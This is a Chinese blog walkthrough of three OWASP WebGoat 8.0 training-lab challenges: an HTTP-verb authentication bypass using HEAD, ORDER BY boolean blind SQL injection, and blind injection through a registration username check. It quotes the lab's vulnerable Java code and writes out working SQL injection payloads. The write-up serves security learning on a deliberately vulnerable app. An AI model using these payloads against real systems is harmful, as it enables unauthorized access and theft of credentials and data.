***本文中涉及到的相关漏洞已报送厂商并得到修复，本文仅限技术研究与讨论，严禁用于非法用途，否则产生的一切后果自行承担。**

 **最近在研究OWASP
WebGoat8.0，鲜鲜实验室有一篇文章特别好，从安装到攻略都有（[传送](http://www.xianxianlabs.com/2018/06/03/webgoat1/)）。但其中有几关这位大佬没有做出答案（但我做出来了），当然我在网上找了一些攻略也没有这几关的具体答案，所以把自己做的答案贴出来，给也在研究这个靶场的兄弟们作参考。**

##  **最后挑战WithoutAccount**  

这道题就是最后一关，页面的意思是投票，点击星星来决定投几星。  

![1.png](https://image.3001.net/images/20180718/15319002131900.png!small)

有意思的是，当我们点击星星之后提示我们需要登录才能投票，但这个页面并没有登录按钮。

我们来查看后台源码：

    
    
    @GetMapping(value ="/vote/{stars}", produces = MediaType.APPLICATION_JSON_VALUE)
    
       @ResponseBody
    
       public ResponseEntity<?> vote(@PathVariable(value ="stars") int nrOfStars, HttpServletRequest request) {
    
           //Simple implementation of VERB Based Authentication
    
           String msg = "";
    
           if (request.getMethod().equals("GET")) {
    
               HashMap<String, Object> json = Maps.newHashMap();
    
               json.put("error", true);
    
               json.put("message", "Sorry but you need to login first inorder to vote");
    
               return ResponseEntity.status(200).body(json);
    
           }
    
           Integer allVotesForStar = votes.getOrDefault(nrOfStars, 0);
    
           votes.put(nrOfStars, allVotesForStar + 1);
    
           return ResponseEntity.ok().header("X-Flag", "Thanks forvoting, your flag is: " + Flag.FLAGS.get(8)).build();
    
    }

查看了源码后发现，只要是GET请求都会返回失败。但这个GetMapping就是get提交的，所以我的思路是，使用其他方法提交请求绕过，先将GET改为POST提交。

![2.png](https://image.3001.net/images/20180718/15319003994709.png!small)

失败了。

然后换成PUT，还是失败，之后换成HEAD，发现了flag。（就是这么简单）

![3.png](https://image.3001.net/images/20180718/15319004349605.png!small)所以这道题主要还是考对http协议的熟悉，假如就只知道提交方式GET，POST，PUT是做不出来的。

##  **SQL Injection** **（mitigation）**  

这道题的意思是我们可以对下面四个主机排序，可以根据hostname，ip，mac，status，description等，对应的山下箭头就可以排序，但需要注意的是，下面的提交框不存在注入（题目也说明了）。最后我们要找到主机“webgoat-prd”的ip地址。  

![4.png](https://image.3001.net/images/20180718/15319005307071.png!small)

没什么好说的，直接抓包查看数据提交方式：  
![5.png](https://image.3001.net/images/20180718/15319005421237.png!small)

发现是get提交，对排序的参数直接写在后面了。我们放入repeater进行重放，查看相应包：  
![6.png](https://image.3001.net/images/20180718/15319005465879.png!small)

右侧就是排序的数据，目前已经按ip排序好了，我们可以尝试修改参数查看是否能排序：  
![7.png](https://image.3001.net/images/20180718/15319005487834.png!small)

可见已经按照id改好了，但id选项并没有在网页上。我们再根据提示简单构造一个逻辑语句：  
![8.png](https://image.3001.net/images/20180718/1531900552700.png!small)

可见已经按照ip排序了，我们将true换成false试试：  
![9.png](https://image.3001.net/images/20180718/15319005552953.png!small)

变成了根据ip排序，所以我们可以将true和false的位置换成逻辑语句，此处存在order
by布尔盲注。WebGoat用的是HSQLDB，这个数据库貌似并没有类似mysql的information_schema库，所以表名只能暴力破解，使用逻辑语句:

    
    
    exists(select * from table_name)

table_name就是需要暴力破解的地方。这道题的表是servers，相比不算难破解。（至少使用字典使用牛津的那本就可以，手动滑稽）

接下来直接构造逻辑语句就好

    
    
    /WebGoat/SqlInjection/servers?column=(CASE+WHEN+((select+left(ip,1)+from+servers+where+hostname='webgoat-prd')='1')+THEN+id+ELSE+description+END)

算是传统的布尔注入payload， **但注意的是left要放在ip前面，而不是整个select语句前面。**
最后拆解出的答案是104.130.219.202

##  **SQL Injection** **（advanced）**

这关也是最后challenge的第三关，是让我们使用tom的账户登录。但除了用户名是tom意外什么也不知道。但给了我们一个注册页面。首先查看后台的语句，登录部分：

    
    
     private static final String PASSWORD_TOM = "thisisasecretfortomonly";
    
        //Make it more random at runtime (good luck guessing)
    
        private static final String USERS_TABLE_NAME = "challenge_users_6" + RandomStringUtils.randomAlphabetic(16);
    
        @Autowired
    
        private WebSession webSession;
    
        public SqlInjectionChallenge() {
    
            log.info("Challenge 6 tablename is: {}", USERS_TABLE_NAME);
    
        }

源码中直接写出了tom的密码，可以直接提交成功过关。但如果想sql注入出密码的话需要费些功夫。

    
    
     @PutMapping  //assignment path is bounded to class so we use different http method :-)
    
        @ResponseBody
    
        public AttackResult registerNewUser(@RequestParam String username_reg, @RequestParam String email_reg, @RequestParam String password_reg) throws Exception {
    
            AttackResult attackResult = checkArguments(username_reg, email_reg, password_reg);
    
            if (attackResult == null) {
    
                Connection connection = DatabaseUtilities.getConnection(webSession);
    
                checkDatabase(connection);
    
                String checkUserQuery = "select userid from " + USERS_TABLE_NAME + " where userid = '" + username_reg + "'";
    
                Statement statement = connection.createStatement();
    
                ResultSet resultSet = statement.executeQuery(checkUserQuery);
    
                if (resultSet.next()) {
    
                    attackResult = failed().feedback("user.exists").feedbackArgs(username_reg).build();
    
                } else {
    
                    PreparedStatement preparedStatement = connection.prepareStatement("INSERT INTO " + USERS_TABLE_NAME + " VALUES (?, ?, ?)");
    
                    preparedStatement.setString(1, username_reg);
    
                    preparedStatement.setString(2, email_reg);
    
                    preparedStatement.setString(3, password_reg);
    
                    preparedStatement.execute();
    
                    attackResult = success().feedback("user.created").feedbackArgs(username_reg).build();
    
                }
    
            }
    
            return attackResult;
    
        }
    
    
     @RequestMapping(method = POST)
    
        @ResponseBody
    
        public AttackResult login(@RequestParam String username_login, @RequestParam String password_login) throws Exception {
    
            Connection connection = DatabaseUtilities.getConnection(webSession);
    
            checkDatabase(connection);
    
            PreparedStatement statement = connection.prepareStatement("select password from " + USERS_TABLE_NAME + " where userid = ? and password = ?");
    
            statement.setString(1, username_login);
    
            statement.setString(2, password_login);
    
            ResultSet resultSet = statement.executeQuery();
    
            if (resultSet.next() && "tom".equals(username_login)) {
    
                return success().build();
    
            } else {
    
                return failed().feedback("NoResultsMatched").build();
    
            }
    
        }

可以看见，登录过程和注册信息入库过程都启用了预编译，几乎没有什么注入可能，唯一有注入点的地方就是检查用户是否注册过这里，直接把username_reg拼接在sql语句中，我的用户名是breeze，再次注册会提示我已经注册过，但我如果把用户名改为breeze’
and1=2 --就会提示我创建账户成功。这样我们就可以在and后构造逻辑语句来进行布尔注入了。但问题是，如何知道表名。  
![10.png](https://image.3001.net/images/20180718/15319005584828.png!small)

在源码中，我们看出，这张表每次使用都会创建新的，用完删除，而表名是challenge_users_6加上随机生成的16位长度的字符串，几乎不可能暴力破解了。但它讲表名输出到了服务器的log上，所以我们可以去log查看本次的表名  
![11.png](https://image.3001.net/images/20180718/15319005609472.png!small)

这次的表名是challenge_users_6WDzKXNcjaYiNPkSr，根据这个表名构造逻辑语句，前面的用户我们使用没有注册过的breeze123，那么查询结果就是假，后面使用or+逻辑语句，这样我们的逻辑语句是真就会返回假，是假就会返回真。

逻辑语句：

    
    
    breeze123'+or+(select+left(password,1)+from+challenge_users_6WDzKXNcjaYiNPkSr+where+userid='tom')='a'+--
![12.png](https://image.3001.net/images/20180718/15319005649220.png!small)![13.png](https://image.3001.net/images/20180718/1531900566207.png!small)写一个脚本就可以得到密码
thisisasecretfortomonly了  

参考：鲜鲜实验室-“Web安全攻防靶场之WebGoat”-[http://www.xianxianlabs.com/2018/06/03/webgoat1/](http://www.example.com)

 ***本文作者：BreezeC，转载请注明来自FreeBuf.COM**

